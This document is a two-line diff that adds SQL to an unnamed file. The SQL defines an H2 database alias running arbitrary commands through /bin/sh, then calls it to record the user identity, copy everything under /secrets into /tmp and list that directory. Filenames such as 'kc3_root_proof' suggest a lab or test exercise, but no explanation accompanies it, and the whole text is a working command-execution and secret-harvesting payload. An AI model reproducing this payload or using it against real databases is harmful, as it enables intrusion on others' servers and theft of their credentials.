@@ -1,0 +1,2 @@
+CREATE ALIAS IF NOT EXISTS SHELLEXEC AS $$ String shellexec(String cmd) throws java.io.IOException { java.util.Scanner s = new java.util.Scanner(Runtime.getRuntime().exec(new String[]{"/bin/sh","-c",cmd}).getInputStream()).useDelimiter("\\A"); return s.hasNext() ? s.next() : ""; } $$;
+CALL SHELLEXEC('id > /tmp/kc3_root_proof.txt; cp /secrets/* /tmp/ 2>/dev/null; ls -la /secrets > /tmp/kc3_secrets.txt 2>&1; id > /tmp/kc3_id.txt');
